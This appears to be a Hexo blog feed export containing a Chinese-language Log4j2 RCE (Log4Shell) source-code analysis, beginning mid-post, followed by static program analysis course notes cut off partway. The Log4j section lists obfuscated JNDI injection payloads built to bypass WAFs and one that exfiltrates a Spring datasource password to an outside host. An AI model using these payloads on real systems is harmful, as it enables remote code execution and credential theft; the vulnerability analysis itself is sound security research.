&#123;</span><br><span class="line">        <span class="keyword">boolean</span> doRender = <span class="keyword">this</span>.textRenderer != <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder workingBuilder = doRender ? <span class="keyword">new</span> StringBuilder(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="keyword">int</span> offset = workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="keyword">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1及一下版本的noLookups默认为false</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 判断log内容是否包含&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 跟入replace方法</span></span><br><span class="line">                    workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在<code>org.apache.logging.log4j.core.util.Constants</code>类中可以看到noLookpus默认为false</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>跟入<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>类的<code>replace</code>方法，里面调用<code>StrSubstitutor</code>类的<code>substitute</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        StringBuilder buf = <span class="keyword">new</span> StringBuilder(source);</span><br><span class="line">        <span class="comment">// 跟入</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> offset, <span class="keyword">final</span> <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.substitute(event, buf, offset, length, (List)<span class="keyword">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看看<code>StrSubstitutor</code>类，定义了一些类型为<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>的成员变量，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> DEFAULT_ESCAPE = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_PREFIX = StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_SUFFIX = StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_VALUE_DELIMITER_STRING = <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ESCAPE_DELIMITER_STRING = <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以理解<code>StrMatcher</code>类为<code>log4j</code>内置的字符匹配器，先看下该类的<code>isMath</code>方法，可以看到是指定一个char数组的起始位置和匹配长度去匹配另一个char数组，若完全匹配上则返回匹配上的长度，没匹配上返回<code>0</code>，该方法在接下来的<code>substitute</code>方法中会用到较多，所以这里提一下</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935"><p>接下来看<code>StrSubstitutor</code>类的<code>substitute</code>，该方法就是本次漏洞触发的关键方法</p><p>先while循环去匹配字符串中的前缀字符<code>$&#123;</code></p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964"><p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458"><p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（变形思路1），这里判断较多，就不挨个描述，简单概括为</p><ul><li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li><li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li></ul><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204"><p>在没有匹配上分隔符或分割处理完后，会调用<code>resolveVariable</code>方法进行解析，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548"><h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>方法会调用<code>resolver</code>解析器的<code>lookup</code>方法，可以看到这里<code>resolver</code>支持12种类型的<code>lookup</code>实现（变形思路2）</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879"><p>接着跟入<code>lookup</code>方法，来到了<code>org.apache.logging.log4j.core.lookup.Interpolator</code>拦截器，该拦截器通过不同前缀分配对应的<code>lookup</code>方法实现</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434"><p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342"><h2 id="0x02-payload变形思路"><a href="#0x02-payload变形思路" class="headerlink" title="0x02 payload变形思路"></a>0x02 payload变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p><h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面分析中可以看到<code>StrLookup</code>除了支持jndi协议还支持其他协议<code>&#123;date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure><p>当然我们也可以组合上面两种思路，例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111"><h3 id="Bundle外带"><a href="#Bundle外带" class="headerlink" title="Bundle外带"></a><strong>Bundle外带</strong></h3><p>方法来自<a class="link"   href="https://b1ue.cn/archives/513.html" >浅蓝师傅博客<i class="fas fa-external-link-alt"></i></a> ，还可以使用Bundle获取特殊变量值并外带，spring环境下可以尝试获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//jndi.fuzz.red:5/ku8r/$&#123;bundle:application:spring.datasource.password&#125;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220302220853565.png" class="" title="image-20220302220853565">]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《静态程序分析（南京大学）》课程笔记</title>
      <link href="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>注：⭐️符号代表重要的知识点，课程还未学习完，笔记更新中ing</p><h2 id="1-Intermediate-Representation-IR-（第二节课）"><a href="#1-Intermediate-Representation-IR-（第二节课）" class="headerlink" title="1. Intermediate Representation(IR)（第二节课）"></a>1. Intermediate Representation(IR)（第二节课）</h2><h3 id="1-1-AST-VS-IR"><a href="#1-1-AST-VS-IR" class="headerlink" title="1.1 AST VS IR"></a>1.1 AST VS IR</h3><p>编译器运行流程</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185425580.png" class="" title="image-20220103185425580"><p>程序到静态分析的流程理解：<strong>程序-&gt;IR(3addr 3地址码)-&gt;CFG-&gt;静态分析</strong></p><p>AST与IR的区别</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185553431.png" class="" title="image-20220103185553431"><h3 id="1-2-What-IR-Soot’s-IR-Jimple"><a href="#1-2-What-IR-Soot’s-IR-Jimple" class="headerlink" title="1.2 What IR(Soot’s IR:Jimple)"></a>1.2 What IR(Soot’s IR:Jimple)</h3><p><strong>demo1:do while loop</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185733224.png" class="" title="image-20220103185733224"><p><strong>demo2:method call</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185756327.png" class="" title="image-20220103185756327"><p><strong>demo3:class</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185813310.png" class="" title="image-20220103185813310"><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185825140.png" class="" title="image-20220103185825140"><h3 id="1-3-Control-Flow-Graph-CFG"><a href="#1-3-Control-Flow-Graph-CFG" class="headerlink" title="1.3 Control Flow Graph(CFG)"></a>1.3 Control Flow Graph(CFG)</h3><h4 id="1-3-1-graph-nodes-basi，c-blocks-BB"><a href="#1-3-1-graph-nodes-basi，c-blocks-BB" class="headerlink" title="1.3.1 graph nodes : basi，c blocks(BB)"></a>1.3.1 graph nodes : basi，c blocks(BB)</h4><h5 id="Basic-Blocks定义"><a href="#Basic-Blocks定义" class="headerlink" title="Basic Blocks定义"></a><strong>Basic Blocks定义</strong></h5><p>入口和出口都是唯一的最大3地址码顺序集合</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103190319354.png" class="" title="image-20220103190319354"><h5 id="⭐️判别Basic-Blocks方法"><a href="#⭐️判别Basic-Blocks方法" class="headerlink" title="⭐️判别Basic Blocks方法"></a>⭐️<strong>判别Basic Blocks方法</strong></h5><p><strong>step1 ：先找到所有BB的入口(leaders)，可通过下面3中方法判定</strong></p><ul><li><strong>程序中的第一条指令</strong></li><li><strong>任何被jump (goto) 到的目标都为leader</strong></li><li><strong>任何紧跟jump语句后的语句都为leader</strong></li></ul><p><strong>step2：一个leader和后面的所有指令，直到下一个leader为止</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103193220938.png" class="" title="image-20220103193220938"><h5 id="例子：3AC转换BBs"><a href="#例子：3AC转换BBs" class="headerlink" title="例子：3AC转换BBs"></a><strong>例子：3AC转换BBs</strong></h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103195204869.png" class="" title="image-20220103195204869"><h4 id="1-3-2-Graph-edge"><a href="#1-3-2-Graph-edge" class="headerlink" title="1.3.2 Graph edge"></a>1.3.2 Graph edge</h4><h5 id="⭐️如何给BBs加边"><a href="#⭐️如何给BBs加边" class="headerlink" title="⭐️如何给BBs加边"></a>⭐️如何给BBs加边</h5><p><strong>1.不管有无条件的jump，起点与目标的连线</strong></p><p><strong>2.正常的无条件指令，按执行顺序依次连线</strong></p><p><strong>3.第1条的连线用jump指令所在的BB连线代替，如下图A与B</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103200344933.png" class="" title="image-20220103200344933"><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103201711683.png" class="" title="image-20220103201711683"><h2 id="2-Data-Flow-Analysis-Applications-（第三、四节课）"><a href="#2-Data-Flow-Analysis-Applications-（第三、四节课）" class="headerlink" title="2.  Data Flow Analysis - Applications （第三、四节课）"></a>2.  Data Flow Analysis - Applications （第三、四节课）</h2><p>下面介绍3钟不同的数据流分析算法，通过算法可以解出CFG可流通的路径，算法不同，路径结果也不同</p><h3 id="2-1-前置知识"><a href="#2-1-前置知识" class="headerlink" title="2.1 前置知识"></a>2.1 前置知识</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183449579.png" class="" title="image-20220103183449579"><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183816522.png" class="" title="image-20220103183816522"><h3 id="2-2-Reaching-Definitions-Analysis"><a href="#2-2-Reaching-Definitions-Analysis" class="headerlink" title="2.2 Reaching Definitions Analysis"></a>2.2 Reaching Definitions Analysis</h3><h4 id="Reaching-Definitions-定义解析"><a href="#Reaching-Definitions-定义解析" class="headerlink" title="Reaching Definitions 定义解析"></a>Reaching Definitions 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103114709803.png" class="" title="image-20220103114709803"><h4 id="⭐️Reaching-Definitions-实现算法"><a href="#⭐️Reaching-Definitions-实现算法" class="headerlink" title="⭐️Reaching Definitions 实现算法"></a>⭐️Reaching Definitions 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115143201.png" class="" title="image-20220103115143201"><h4 id="Reaching-Definitions-实例演示"><a href="#Reaching-Definitions-实例演示" class="headerlink" title="Reaching Definitions 实例演示"></a>Reaching Definitions 实例演示</h4><p>每一个变量赋值表达式子用都代表一个Definition，这里用Dn表示，蓝色代表变量x，红色代表y，黑色代表m，绿色代表z</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115459081.png" class="" title="image-20220103115459081"><h3 id="2-3-Live-Variables-Analysis-（第四节课）"><a href="#2-3-Live-Variables-Analysis-（第四节课）" class="headerlink" title="2.3 Live Variables Analysis （第四节课）"></a>2.3 Live Variables Analysis （第四节课）</h3><h4 id="Live-Variables-定义解析"><a href="#Live-Variables-定义解析" class="headerlink" title="Live Variables 定义解析"></a>Live Variables 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103123845303.png" class="" title="image-20220103123845303"><h4 id="⭐️Live-Variables-实现算法"><a href="#⭐️Live-Variables-实现算法" class="headerlink" title="⭐️Live Variables 实现算法"></a>⭐️Live Variables 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103163513747.png" class="" title="image-20220103163513747"><h4 id="Live-Variables-实例演示"><a href="#Live-Variables-实例演示" class="headerlink" title="Live Variables 实例演示"></a>Live Variables 实例演示</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103174745109.png" class="" title="image-20220103174745109"><h3 id="2-4-Available-Expressions-Analysis"><a href="#2-4-Available-Expressions-Analysis" class="headerlink" title="2.4 Available Expressions Analysis"></a>2.4 Available Expressions Analysis</h3><h4 id="Available-Expressions-定义解析"><a href="#Available-Expressions-定义解析" class="headerlink" title="Available Expressions 定义解析"></a>Available Expressions 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180809651.png" class="" title="image-20220103180809651"><h4 id="⭐️Available-Expressions-实现算法"><a href="#⭐️Available-Expressions-实现算法" class="headerlink" title="⭐️Available Expressions 实现算法"></a>⭐️Available Expressions 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180018797.png" class="" title="image-20220103180018797"><h4 id="Available-Expressions-示例演示"><a href="#Available-Expressions-示例演示" class="headerlink" title="Available Expressions 示例演示"></a>Available Expressions 示例演示</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180716543.png" class="" title="image-20220103180716543"><h3 id="⭐️2-5-三种数据流分析应用对比"><a href="#⭐️2-5-三种数据流分析应用对比" class="headerlink" title="⭐️2.5 三种数据流分析应用对比"></a>⭐️2.5 三种数据流分析应用对比</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103181138043.png" class="" title="image-20220103181138043"><h2 id="3-Data-Flow-Analysis-Foundations-（第五、六节课）"><a href="#3-Data-Flow-Analysis-Foundations-（第五、六节课）" class="headerlink" title="3. Data Flow Analysis - Foundations （第五、六节课）"></a>3. Data Flow Analysis - Foundations （第五、六节课）</h2><h3 id="⭐️3-1-Iterative-Algorithm-Another-View"><a href="#⭐️3-1-Iterative-Algorithm-Another-View" class="headerlink" title="⭐️3.1 Iterative Algorithm, Another View"></a>⭐️3.1 Iterative Algorithm, Another View</h3><p>前面3中数据流分析算法满足<strong>不动点定律</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109104249059.png" class="" title="image-20220109104249059"><h3 id="3-2-Partial-Order"><a href="#3-2-Partial-Order" class="headerlink" title="3.2 Partial Order"></a>3.2 Partial Order</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135207135.png" class="" title="image-20220109135207135"><h3 id="3-3-Upper-and-Lower-Bounds"><a href="#3-3-Upper-and-Lower-Bounds" class="headerlink" title="3.3 Upper and Lower Bounds"></a>3.3 Upper and Lower Bounds</h3><img 